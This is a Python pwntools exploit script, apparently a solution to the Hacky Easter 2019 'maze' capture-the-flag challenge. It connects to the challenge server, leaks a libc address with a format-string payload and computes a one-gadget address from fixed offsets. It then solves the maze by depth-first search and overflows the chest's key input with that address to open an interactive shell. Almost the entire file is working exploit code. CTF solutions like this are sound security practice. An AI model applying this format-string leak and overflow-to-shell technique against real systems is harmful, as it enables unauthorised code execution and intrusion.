from pwn import *

context.binary = './maze'
nc = remote('whale.hacking-lab.com', 7331)

nc.sendlineafter('>', '%19$p')
nc.sendlineafter('>', '3')
nc.sendlineafter('>', 'whoami')

leak = nc.recvuntil('>')
pos = leak.find('0x7f')

leak = leak[pos:pos + 14]
leak = int(leak, 16)

libc_offset = 0x20830
gadget_offset = 0x4526a

libc_base = leak - libc_offset
gadget_address = libc_base + gadget_offset

currentPoint = (0, 0)
visited = [currentPoint]
moves = []
haveKey = False

nc.sendline('whoami')

while True:
  current = nc.recvuntil('>')
  print current

  canGoUp = True
  canGoDown = True
  canGoRight = True
  canGoLeft = True

  for line in current.split("\x1b"):
      currentLine = line.strip()

      if currentLine == "[9;10H|":
         canGoLeft = False

      if currentLine == "[9;16H|":
         canGoRight = False

      if currentLine == "[7;10H+-----+":
         canGoUp = False

      if currentLine == "[11;10H+-----+":
         canGoDown = False

  nc.writeline('search')
  search_result = nc.recvuntil('>').replace("\x1b[", "").split("\n")[1]

  if (search_result not in ["There is nothing interesting here.",
                       "You found a rusty nail.",
                       "Ugh! There is a skeleton!",
                       "Ugh! There is a spider!",
                       "You found a map, but unfortunately someone else has already torn out a piece.",
                       "You found an arrow stuck in the wall.",
                       "You found a broken key, looks like it won't work anymore.",
                       "Ugh! There is a giant rat!",
                       "There is a message scratched into the wall 'Hacky Easter 2019, by Darkice'."]):

     if search_result.startswith("You found a key!"):
        nc.writeline('pick up')

        extractedKey = nc.recvuntil('>').replace("\x1b[", "")

        key = extractedKey.split("You pick up the key: ")[1].split(";")[0]
        haveKey = True

     elif search_result.startswith("You found a locked chest!"):
        if not haveKey:
           print 'Found a chest but don\'t have a key...'
           break

        nc.writeline('open')
        nc.recvuntil('>')

        sentKey = key[:32].encode() + p64(gadget_address) 
        nc.writeline(sentKey)

        nc.writeline('')
        nc.writelineafter('>', '0')
        nc.interactive()

  if canGoUp:
    nextPoint = (currentPoint[0], currentPoint[1] + 1)

    if nextPoint not in visited:
       currentPoint = nextPoint
       visited.append(currentPoint)
       moves.append((0, 1))

       nc.writeline('go north')
       continue

  if canGoDown:
    nextPoint = (currentPoint[0], currentPoint[1] - 1)

    if nextPoint not in visited:
       currentPoint = nextPoint
       visited.append(currentPoint)
       moves.append((0, -1))

       nc.writeline('go south')
       continue

  if canGoRight:
    nextPoint = (currentPoint[0] + 1, currentPoint[1])

    if nextPoint not in visited:
       currentPoint = nextPoint
       visited.append(currentPoint)
       moves.append((1, 0))

       nc.writeline('go east')
       continue

  if canGoLeft:
    nextPoint = (currentPoint[0] - 1, currentPoint[1])

    if nextPoint not in visited:
       currentPoint = nextPoint
       visited.append(currentPoint)
       moves.append((-1, 0))

       nc.writeline('go west')
       continue

  if not moves:
     break

  diff = moves.pop()

  if (diff == (1, 0)):
       nc.writeline('go west')

  elif (diff == (0, 1)): 
       nc.writeline('go south')

  elif (diff == (-1, 0)): 
       nc.writeline('go east')

  elif (diff == (0, -1)): 
       nc.writeline('go north')

  currentPoint = (currentPoint[0] + (-1 * diff[0]), currentPoint[1] + (-1 * diff[1]))
